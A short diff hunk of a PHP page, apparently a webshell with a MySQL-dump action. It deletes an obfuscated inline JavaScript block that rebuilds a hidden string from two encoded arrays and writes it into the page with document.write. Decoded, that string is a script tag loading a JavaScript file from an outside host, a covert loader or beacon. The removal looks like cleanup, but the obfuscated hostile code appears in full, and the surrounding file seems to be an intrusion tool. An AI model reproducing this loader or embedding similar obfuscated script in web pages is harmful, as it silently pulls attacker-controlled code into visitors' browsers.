@@ -165,15 +165,6 @@ if($doing=='mysqldown'){
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=gbk">
 <title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>
-<script type="text/javascript" language="javascript">
-<!--
-ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
-MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
-OT="";
-for(j=0;j<MI.length;j++){
-OT+=ML.charAt(MI.charCodeAt(j)-48);
-}document.write(OT);
-// --></script>
 <style type="text/css">
 body,td{font: 12px Arial,Tahoma;line-height: 16px;}
 .input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
